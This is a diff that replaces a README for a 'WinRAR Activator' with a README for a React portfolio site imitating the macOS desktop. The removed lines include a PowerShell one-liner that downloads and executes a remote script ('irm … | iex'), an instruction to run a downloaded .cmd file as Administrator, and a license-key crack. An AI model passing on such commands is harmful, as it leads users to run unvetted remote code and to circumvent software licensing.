@@ -1,47 +1,63 @@
-#   ABC WinRAR Activator
+# playground-macos
 
-<img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Animated-Fluent-Emojis/master/Emojis/Smilies/Face%20with%20Peeking%20Eye.png" alt="Face with Peeking Eye" width="51" height="51" />
+My portfolio website simulating macOS's GUI: https://portfolio.zxh.me
 
-##   How to use it?
+Powered by [React](https://reactjs.org/) + [Zustand](https://zustand-demo.pmnd.rs/) + [UnoCSS](https://uno.antfu.me/) + [TypeScript](https://www.typescriptlang.org/) + [Vite](https://vitejs.dev/).
 
-###   A. PowerShell (Windows 10/11)
+![light mode](./public/screenshots/light.png)
+![dark mode](./public/screenshots/dark.png)
 
----
 
-Open PowerShell or Terminal.
+&nbsp;
 
-Copy-Paste The Code Below, Paste In PowerShell or Terminal And Press Enter:
+## Usage
 
-    irm https://abccompanypoharka.github.io/ABC-WRA/ABCWRA.ps1 | iex
+Clone the repo and install dependencies:
 
-That's It Enjoy !!!
+```bash
+pnpm install
+```
 
-<br>
+Start dev server (with hot reloading):
 
-###   B. CMD As Admin (Windows 7/8/8.1)
+```bash
+pnpm dev
+```
 
----
+Build for production with minification to the `dist` folder:
 
-Download The File With ".cmd" Extension From This Repo.
+```bash
+pnpm build
+```
 
-Right-Click On The File And Select "Run as Administrator".
 
-The Activation Will Begin And Automatically Complete.
+&nbsp;
 
-That's It Enjoy !!!
+## Changelog
 
-<br>
+- **Update 2023.06.26**: Improve [FaceTime](https://support.apple.com/en-us/HT208176).
 
-###  C. Manual Activation (Windows 7/8/8.1)
+- **Update 2023.06.25**: Add [Typora](https://typora.io/), built on top of [Milkdown](https://milkdown.dev/).
 
----
+- **Update 2021.12.05**: Simulated the device's actual battery state using [Battery API](https://developer.mozilla.org/en-US/docs/Web/API/Battery_Status_API), displaying 100% charge on [unsupported browsers](https://developer.mozilla.org/en-US/docs/Web/API/Battery_Status_API#browser_compatibility).
 
-Download The "rarreg.key" File From This Repo.
+- **Update 2021.12.05**: Refactored for cleaner code by utilizing functional components and hooks. Refer to [this branch](https://github.com/Renovamen/playground-macos/tree/class-component) for the previous version implemented with class components.
 
-`Copy` or `Cut` The File And `Paste` It In The Installation Folder Of WinRAR  (e.g., C:\Program Files\WinRAR\).
 
-Close Any Open WinRAR Processes And Start It Again.
+&nbsp;
 
-That's It Enjoy !!!
+## Credits
 
-<br>
+- macOS
+  - [Monterey](https://www.apple.com/macos/monterey/)
+  - [Catalina](https://www.apple.com/bw/macos/catalina/)
+- [macOS Icon Gallery](https://www.macosicongallery.com/)
+- [sindresorhus/file-icon-cli](https://github.com/sindresorhus/file-icon-cli)
+- [vivek9patel.github.io](https://github.com/vivek9patel/vivek9patel.github.io)
+
+
+&nbsp;
+
+## License
+
+[MIT](MIT)
